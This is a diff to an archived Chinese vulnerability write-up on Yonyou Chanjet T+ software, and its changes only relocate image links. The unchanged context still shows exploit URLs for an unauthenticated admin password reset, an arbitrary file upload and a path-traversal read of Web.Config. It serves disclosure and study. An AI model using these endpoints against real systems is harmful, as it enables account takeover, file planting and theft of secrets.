@@ -45,7 +45,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tz54n106AAmbCdASmyn9Wg)
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4O4dl1Y2a9LqiatyWWqR5TBWaDXM0urygClfibLafuVPWuLTpG6XGf1RlxhKke6Km9ys61OSkRiagzw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)
+![](../../.resource/remote/082a998e1d8b15ab82dbc17ad00ca58bcaaf4e8a9daaa1c0df20eb451b2fb746.gif)
 
  **文章声明**
 
@@ -72,7 +72,7 @@ schema_version: "1"
 
 访问首页显示如下
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOZibKcoICLd5ARVlm6IxGtkianuFLcmUPibQyfq5FEQwmsRib1lmjxFypHDF8upkQzicwTXQPktia9g74Q/640?wx_fmt=jpeg)
+![](../../.resource/remote/eaa7750e6c5f6c15096a4a0c42626a83e26e5a377309c5066399029752bb33d6.jpg)
 
 访问下列地址查看是否存在漏洞
 
@@ -80,7 +80,7 @@ schema_version: "1"
 http://xx.xx.xx.xx/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOZibKcoICLd5ARVlm6IxGtk6iatq1xSwvzOxbEwdBDUSd8uWxDDaRYDOlRALcybtVbzU8ZJNtl2sVw/640?wx_fmt=jpeg)
+![](../../.resource/remote/268a57ae0bbc6b0dec09f696388aad20f021ccb189bb576926020e364dfedeab.jpg)
 
 可以看到重置密码仅需 pwdNew 参数
 
@@ -104,11 +104,11 @@ Content-Length: 49
 
 > 请求长度说明：原资料 Content-Length 为 49；保留原始标头；其数值未据实际请求体重新计算或验证。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOZibKcoICLd5ARVlm6IxGtkcfG1ia4bNkQruxgCiaIgJ1Y070dFIILCuVSCunVyPpDMjBecUdvPyS3w/640?wx_fmt=jpeg)
+![](../../.resource/remote/59a64527480107d9c452c48189b4e09c905ebf63ab5c58ad0c8675c3091c2e87.jpg)
 
 重置后的系统管理员账号密码为 admin/123qwe
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOZibKcoICLd5ARVlm6IxGtktFIuY9ZRqv1Wgb2NYpwQzIuzwmLZUxPC5SoLlJiagWWXictVlbrUzGQw/640?wx_fmt=jpeg)
+![](../../.resource/remote/3441eabc32c7f7b7a01bbf492f8ebf2ae22c9bb54a92604da7ba03deb023d18b.jpg)
 
 用友 畅捷通 T+ Upload.aspx 任意文件上传漏洞
 ------------------------------
@@ -131,7 +131,7 @@ Content-Length: 49
 http://xx.xx.xx.xx/tplus/SM/SetupAccount/Upload.aspx?preload=1
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOZibKcoICLd5ARVlm6IxGtke0SLvGL8k1KS1SvaExCRUWXcxKnpahfa2GMpX7XScRBVib9CBicicpbaw/640?wx_fmt=jpeg)
+![](../../.resource/remote/f8b7e28c347402fdbcb60d7485a94fa16b3abe3d9af00cbbea110f2846ed9b30.jpg)
 
 漏洞利用 poc 如下
 
@@ -159,7 +159,7 @@ aaaa
 
 > 请求长度说明：原资料 Content-Length 为 188；保留原始标头；其数值未据实际请求体重新计算或验证。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOZibKcoICLd5ARVlm6IxGtkfP7Kn7icm0M85zODQRcHUpu4kS3rpyOImp7fyvOrNmdzsN8VbB21sMg/640?wx_fmt=jpeg)
+![](../../.resource/remote/7b401bd74aaecdf9219819f02dc53c9a996ef63415077249090e354e634d83ab.jpg)
 
 直接访问写入的文件
 
@@ -167,7 +167,7 @@ aaaa
 http://xx.xx.xx.xx/tplus/SM/SetupAccount/aaaa.txt
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOZibKcoICLd5ARVlm6IxGtkKscqiaq0GmOgggib6Ny9EiaWOsBv4TgWKFLyu15b3ZMricIMrB90WIC0FQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/f62027f66ef0b5587d9cfe86541cdde0aeec30c6ed239c94fb248c971ceb93a6.jpg)
 
 用友 畅捷通 T+ DownloadProxy.aspx 任意文件读取漏洞
 -------------------------------------
@@ -188,7 +188,7 @@ http://xx.xx.xx.xx/tplus/SM/SetupAccount/aaaa.txt
 /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/szicQ7q9y2nOZibKcoICLd5ARVlm6IxGtk0MxFdd6SlwZPRZR1nrqvsGvv7yUMNOYDkKDbIXYiba89ypxI1rPVm4Q/640?wx_fmt=jpeg)
+![](../../.resource/remote/daefa8c88b08df138d1fa69181a06ed8338a516c52d06f5513c7bd25f0172f13.jpg)
 
 ---
 
